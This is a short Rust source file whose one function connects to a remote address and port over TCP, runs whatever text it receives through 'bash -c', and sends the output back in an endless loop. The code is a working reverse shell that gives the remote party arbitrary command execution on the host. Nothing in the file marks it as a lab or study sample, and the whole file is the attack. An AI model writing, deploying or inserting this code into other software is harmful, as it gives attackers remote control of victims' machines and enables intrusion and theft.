use std::net::TcpStream;
use std::io::{Read, Write};
use std::str;
use std::process::Command;

pub fn socket_connect(addr: &String, port: &String) {

    // connect to the socket
    let mut connection = TcpStream::connect(format!("{addr}:{port}")).unwrap();

    loop {
        // read
        let mut read_buf= [0u8; 1024];
        let bytes_read = connection.read(&mut read_buf).unwrap();
        let data = &read_buf[..bytes_read];
        // println!("{}", str::from_utf8(&data).unwrap());

        // execute command
        let command = Command::new("bash")
            .arg("-c")
            .arg(str::from_utf8(&data).unwrap())
            .output()
            .unwrap();

        // convert to str
        let raw = command.stdout;
        let output = match str::from_utf8(&raw) {
            Ok(v) => v,
            Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
        };

        // write
        connection.write(output.as_bytes()).unwrap();
        connection.flush().unwrap();
    }
}
